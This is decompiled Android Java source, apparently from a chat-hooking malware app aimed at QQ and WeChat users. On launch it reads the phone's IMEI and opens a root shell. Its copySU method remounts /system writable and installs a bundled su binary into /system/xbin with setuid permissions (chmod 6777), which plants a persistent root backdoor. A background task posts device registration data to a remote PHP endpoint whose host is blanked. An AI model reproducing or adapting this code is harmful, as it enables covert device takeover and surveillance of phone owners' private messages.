package com.example.chathook;

import android.app.Application;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;

public class InjectApplicaiton extends Application {
    public static String MMSN = null;
    public static final String MM_SOCKET_SERVER = "MM_SERVER";
    public static String QQSN = null;
    public static final String QQ_SOCKET_SERVER = "QQ_SERVER";
    public static String SU_cmd = "competing_su";
    public static DataOutputStream mOutputStream;
    public InputStream mInputStream;
    private String version = "13.05.20";

    class MsgTask extends AsyncTask<String, Integer, String> {
        MsgTask() {
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... params) {
            try {
                String SERVER_URL = "http:///run_app.php";
                StringBuilder builder = new StringBuilder();
                builder.append(params[0]);
                HttpPost request = new HttpPost("http:///run_app.php");
                Log.i("yincc", " regist msg: \n" + builder.toString());
                request.setEntity(new ByteArrayEntity(builder.toString().getBytes("UTF8")));
                new DefaultHttpClient().execute(request);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        /* access modifiers changed from: protected */
        public void onCancelled() {
            super.onCancelled();
        }
    }

    public void onCreate() {
        super.onCreate();
        getSN();
        try {
            File sufile = new File("/system/bin/su");
            File su1file = new File("/system/xbin/su");
            if (sufile.exists() || su1file.exists()) {
                SU_cmd = "su";
            }
            mOutputStream = new DataOutputStream(Runtime.getRuntime().exec(SU_cmd).getOutputStream());
        } catch (IOException e) {
            Log.i("yincc", "Exception " + e.getMessage());
            e.printStackTrace();
        }
    }

    public void getSN() {
        char[] sn = new char[14];
        String imei = ((TelephonyManager) getSystemService("phone")).getDeviceId();
        Log.i("yincc", "imei = " + imei);
        if (imei == null) {
            QQSN = new String("IMEI ERROR");
            MMSN = new String("IMEI ERROR");
            return;
        }
        int i = 0;
        while (i < imei.length() && i < 14) {
            sn[i] = (char) (((imei.charAt(i) + i) % 26) + 65);
            i++;
        }
        QQSN = new String(sn);
        i = 0;
        while (i < imei.length() && i < 14) {
            sn[i] = (char) ((((imei.charAt(i) + i) + 1) % 26) + 65);
            i++;
        }
        MMSN = new String(sn);
        Log.i("ligan", "QQSN = " + QQSN);
        Log.i("ligan", "MMSN =" + MMSN);
    }

    private String getQQmsg() {
        StringBuilder builder = new StringBuilder();
        builder.append(QQSN);
        builder.append("\n");
        builder.append("1\n");
        builder.append(this.version);
        builder.append("\n");
        builder.append(VERSION.SDK_INT);
        return builder.toString();
    }

    private String getMMmsg() {
        StringBuilder builder = new StringBuilder();
        builder.append(MMSN);
        builder.append("\n");
        builder.append("0\n");
        builder.append(this.version);
        builder.append("\n");
        builder.append(VERSION.SDK_INT);
        return builder.toString();
    }

    private void copySU(Context context) {
        String systemDev = InjectUtils.getMountDate(this);
        String sufilepath = new StringBuilder(String.valueOf(context.getFilesDir().getAbsolutePath())).append("/competing_su").toString();
        InjectUtils.exeCMD(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("" + "mount -o remount,rw " + systemDev + " /system \n")).append("mount -o remount,rw /system \n").toString())).append("cat ").append(sufilepath).append(" > /system/xbin/competing_su \n").toString());
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
        }
        File originalsuFile = new File(sufilepath);
        File sufile = new File("/system/xbin/competing_su");
        Log.i("ligan", "file length =" + sufile.length() + "sufile = " + originalsuFile.length());
        while (sufile.length() != originalsuFile.length()) {
            InjectUtils.exeCMD("cat " + sufilepath + " > /system/xbin/competing_su \n");
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e2) {
            }
            Log.i("ligan", "cat su file ");
            Log.i("ligan", "file length =" + sufile.length() + "sufile = " + originalsuFile.length());
        }
        InjectUtils.exeCMD("chown root.root /system/xbin/competing_su \n" + "chmod 6777 /system/xbin/competing_su \n");
    }

    private void copyAssetsFiles(final String fileName) {
        new Thread(new Runnable() {
            /* JADX WARNING: Removed duplicated region for block: B:22:0x0068 A:{SYNTHETIC, Splitter:B:22:0x0068} */
            /* JADX WARNING: Removed duplicated region for block: B:35:? A:{SYNTHETIC, RETURN} */
            /* JADX WARNING: Removed duplicated region for block: B:16:0x005c A:{SYNTHETIC, Splitter:B:16:0x005c} */
            public void run() {
                /*
                r9 = this;
                r3 = 0;
                r7 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0056 }
                r7.<init>();	 Catch:{ Exception -> 0x0056 }
                r8 = com.example.chathook.InjectApplicaiton.this;	 Catch:{ Exception -> 0x0056 }
                r8 = r8.getFilesDir();	 Catch:{ Exception -> 0x0056 }
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x0056 }
                r8 = "/";
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x0056 }
                r8 = r3;	 Catch:{ Exception -> 0x0056 }
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x0056 }
                r2 = r7.toString();	 Catch:{ Exception -> 0x0056 }
                r5 = new java.io.File;	 Catch:{ Exception -> 0x0056 }
                r5.<init>(r2);	 Catch:{ Exception -> 0x0056 }
                r7 = r5.exists();	 Catch:{ Exception -> 0x0056 }
                if (r7 != 0) goto L_0x002e;
            L_0x002b:
                r5.createNewFile();	 Catch:{ Exception -> 0x0056 }
            L_0x002e:
                r7 = com.example.chathook.InjectApplicaiton.this;	 Catch:{ Exception -> 0x0056 }
                r7 = r7.getResources();	 Catch:{ Exception -> 0x0056 }
                r7 = r7.getAssets();	 Catch:{ Exception -> 0x0056 }
                r8 = r3;	 Catch:{ Exception -> 0x0056 }
                r6 = r7.open(r8);	 Catch:{ Exception -> 0x0056 }
                r7 = r6.available();	 Catch:{ Exception -> 0x0056 }
                r0 = new byte[r7];	 Catch:{ Exception -> 0x0056 }
                r6.read(r0);	 Catch:{ Exception -> 0x0056 }
                r4 = new java.io.FileOutputStream;	 Catch:{ Exception -> 0x0056 }
                r4.<init>(r5);	 Catch:{ Exception -> 0x0056 }
                r4.write(r0);	 Catch:{ Exception -> 0x007a, all -> 0x0077 }
                if (r4 == 0) goto L_0x0075;
            L_0x0051:
                r4.close();	 Catch:{ IOException -> 0x0071 }
                r3 = r4;
            L_0x0055:
                return;
            L_0x0056:
                r1 = move-exception;
            L_0x0057:
                r1.printStackTrace();	 Catch:{ all -> 0x0065 }
                if (r3 == 0) goto L_0x0055;
            L_0x005c:
                r3.close();	 Catch:{ IOException -> 0x0060 }
                goto L_0x0055;
            L_0x0060:
                r1 = move-exception;
                r1.printStackTrace();
                goto L_0x0055;
            L_0x0065:
                r7 = move-exception;
            L_0x0066:
                if (r3 == 0) goto L_0x006b;
            L_0x0068:
                r3.close();	 Catch:{ IOException -> 0x006c }
            L_0x006b:
                throw r7;
            L_0x006c:
                r1 = move-exception;
                r1.printStackTrace();
                goto L_0x006b;
            L_0x0071:
                r1 = move-exception;
                r1.printStackTrace();
            L_0x0075:
                r3 = r4;
                goto L_0x0055;
            L_0x0077:
                r7 = move-exception;
                r3 = r4;
                goto L_0x0066;
            L_0x007a:
                r1 = move-exception;
                r3 = r4;
                goto L_0x0057;
                */
                throw new UnsupportedOperationException("Method not decompiled: com.example.chathook.InjectApplicaiton$AnonymousClass1.run():void");
            }
        }).start();
    }

    private void copyAssetsFiles_jar(final String fileName) {
        new Thread(new Runnable() {
            /* JADX WARNING: Removed duplicated region for block: B:22:0x005a A:{SYNTHETIC, Splitter:B:22:0x005a} */
            /* JADX WARNING: Removed duplicated region for block: B:35:? A:{SYNTHETIC, RETURN} */
            /* JADX WARNING: Removed duplicated region for block: B:16:0x004e A:{SYNTHETIC, Splitter:B:16:0x004e} */
            public void run() {
                /*
                r9 = this;
                r3 = 0;
                r7 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0048 }
                r8 = "/sdcard/";
                r7.<init>(r8);	 Catch:{ Exception -> 0x0048 }
                r8 = r3;	 Catch:{ Exception -> 0x0048 }
                r7 = r7.append(r8);	 Catch:{ Exception -> 0x0048 }
                r2 = r7.toString();	 Catch:{ Exception -> 0x0048 }
                r5 = new java.io.File;	 Catch:{ Exception -> 0x0048 }
                r5.<init>(r2);	 Catch:{ Exception -> 0x0048 }
                r7 = r5.exists();	 Catch:{ Exception -> 0x0048 }
                if (r7 != 0) goto L_0x0020;
            L_0x001d:
                r5.createNewFile();	 Catch:{ Exception -> 0x0048 }
            L_0x0020:
                r7 = com.example.chathook.InjectApplicaiton.this;	 Catch:{ Exception -> 0x0048 }
                r7 = r7.getResources();	 Catch:{ Exception -> 0x0048 }
                r7 = r7.getAssets();	 Catch:{ Exception -> 0x0048 }
                r8 = r3;	 Catch:{ Exception -> 0x0048 }
                r6 = r7.open(r8);	 Catch:{ Exception -> 0x0048 }
                r7 = r6.available();	 Catch:{ Exception -> 0x0048 }
                r0 = new byte[r7];	 Catch:{ Exception -> 0x0048 }
                r6.read(r0);	 Catch:{ Exception -> 0x0048 }
                r4 = new java.io.FileOutputStream;	 Catch:{ Exception -> 0x0048 }
                r4.<init>(r5);	 Catch:{ Exception -> 0x0048 }
                r4.write(r0);	 Catch:{ Exception -> 0x006c, all -> 0x0069 }
                if (r4 == 0) goto L_0x0067;
            L_0x0043:
                r4.close();	 Catch:{ IOException -> 0x0063 }
                r3 = r4;
            L_0x0047:
                return;
            L_0x0048:
                r1 = move-exception;
            L_0x0049:
                r1.printStackTrace();	 Catch:{ all -> 0x0057 }
                if (r3 == 0) goto L_0x0047;
            L_0x004e:
                r3.close();	 Catch:{ IOException -> 0x0052 }
                goto L_0x0047;
            L_0x0052:
                r1 = move-exception;
                r1.printStackTrace();
                goto L_0x0047;
            L_0x0057:
                r7 = move-exception;
            L_0x0058:
                if (r3 == 0) goto L_0x005d;
            L_0x005a:
                r3.close();	 Catch:{ IOException -> 0x005e }
            L_0x005d:
                throw r7;
            L_0x005e:
                r1 = move-exception;
                r1.printStackTrace();
                goto L_0x005d;
            L_0x0063:
                r1 = move-exception;
                r1.printStackTrace();
            L_0x0067:
                r3 = r4;
                goto L_0x0047;
            L_0x0069:
                r7 = move-exception;
                r3 = r4;
                goto L_0x0058;
            L_0x006c:
                r1 = move-exception;
                r3 = r4;
                goto L_0x0049;
                */
                throw new UnsupportedOperationException("Method not decompiled: com.example.chathook.InjectApplicaiton$AnonymousClass2.run():void");
            }
        }).start();
    }
}
